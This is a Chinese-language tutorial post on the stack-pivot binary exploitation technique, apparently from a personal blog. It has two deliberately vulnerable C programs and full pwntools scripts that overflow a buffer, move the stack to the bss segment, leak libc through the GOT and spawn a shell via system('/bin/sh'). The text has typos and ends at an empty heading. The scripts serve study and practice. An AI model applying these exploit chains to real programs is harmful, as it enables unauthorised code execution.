+++
date = '2025-07-13T13:49:03+08:00'
draft = false
title = 'Stack'

+++

## stack_pivot

这里我们进行分析stack_pivot这个攻击模式

这里分享这个的背景是因为我们在攻击模块的时候会出现溢出长度不够或者溢出长度不到ret地址的问题，而这个问题的解决方法也是我们这一节的标题也就是stack_pivot(栈迁移)那我们先来说明一下本质好了

本质：主要是通过溢出手段是的我们的rbp/rsp迁移到一个可以读可写的地方进行一个攻击

主要使用的指令：leave，pop rbp

目的：1.可以与输入函数搭配使用，是心啊任意地址的写

​	    2.变相增加溢出长度

那么我们这先来看一下我们需要使用到的指令也就是leave和pop rbp

这里我们先分析一下leave指令，它主要的使用用途就是返回到上一级函数时，需要恢复原本栈的空间，这个指令也同样时一个组合指令分别位mov esp,ebp; pop ebp;

而pop这个指令同样等同与mov ebp,[esp],sub esp,4(32位)

如果阅读者有一些汇编的基础我们就可以很好理解我们需要的攻击思路了，通过这两个主要的命令点我们就可以有一定的思路就是我们可以通过控制ebp/rbp来使得我们的恢复函数的ebp/rbp是我们需要的栈的位置使得我们可以进行一个迁移操作

这里我们就使用一个例题来说明

### 例题：

这我们先分享一下如何通过rbp进行一个迁移，当我们可以看明白汇编的时候我们大概率就可以明白，在汇编中大部分迁移都是通过ebp/rbp的相对地址进行要给迁移的因此我们因此，这个也就是pop rbp这个命令的使用的一个思路了

通过pop rbp进行一个文件的构造因此这个也是一个比较简单的方法这个方法提就不演示了

那我们就来看他对另外两种情况也就是我们是否可以溢出到ret地址的位置来区分

#### 有ret

```c
#include "stdio.h"
int main(){
    char a[0x20]={};
    read(0,a,0x30);
    write(1,a,0x30);
    return 0;
}
/*编译命令
    gcc main.c -fno-stack-protector -no-pie -o pwn_tran
*/
```

可以通过这个函数进行一个练手

这个题目的主要思路就是我们可以把这个栈结构迁移到bss段上去使得我们可以在bss段上写上我们的结构体来构造payload

当他的代码可以是这个

```py

from pwn import *
p=process('pwn_tran')
e=ELF('',checksec=False)
libc=ELF('libc-2.33.so',checksec=False)
leave=0x4011bd
ret=0x4011be
read=0x401182
write=0x40119d
bss=0x404048
read_got=0x404020
rdi=0x0000000000401223
p.send(b'a'*0x20+p64(bss)+p64(read))
p.read()
payload=b'/bin/sh\x00'+p64(bss+0x800)+p64(read)+p64(bss-0x18)+p64(bss-0x18)+p64(write)
p.send(payload)
p.read(0x40)
read_addr=u64(p.read(8))
libc.address=read_addr-libc.sym['read']
print(hex(libc.address))
system=libc.sym['system']
bin_sh=next(libc.search(b"/bin/sh"))
bss=bss+0x700
payload=p64(bss+0x200)+p64(rdi)+p64(bin_sh)+p64(system)+p64(bss+0x100-0x20)+p64(leave)
p.send(payload)
p.interactive()
```

#### 无ret

```
#include<stdio.h>
char b[0x20]={};
void func(){
    char a[0x20]={};
    read(0,a,0x28);
    read(0,b,0x60);
    write(1,b,0x60);
}
int main(){
    char a=0;
    func();
}
/*编译命令
    gcc pwn_tran.c -fno-stack-protector -no-pie -o pwn_tran
*/
```

```py
from pwn import *
b_add=0x404060
read_got=0x404020
read=0x401182
write_plt=0x401050
read_plt=0x401060
rdi=0x401263
rsi_15=0x401261
leave=0x4011d4

e=ELF('./pwn_tran',checksec=0)
libc=ELF('libc-2.33.so',checksec=0)
p=process('pwn_tran')
p.send(b'a'*0x20+p64(b_add))
p.sendline(p64(b_add)+p64(rdi)+p64(1)+p64(rsi_15)+p64(read_got)+p64(0)+p64(write_plt)+p64(read))
p.read(0x60)
d=u64(p.read(8))
print(hex(d))
libc.address=d-libc.sym['read']
system=libc.sym['system']
bin_sh=next(libc.search('/bin/sh'))
p.sendline('')

payload=p64(b_add+0x808)+p64(rdi)+p64(0)+p64(rsi_15)+p64(b_add+0x808)+p64(0)+p64(read_plt)+p64(leave)
print(hex(len(payload)))
p.send(payload)
pause()
p.send(p64(b_add+0x900)+p64(rdi)+p64(bin_sh)+p64(system))
p.interactive()
```

## 栈溢出

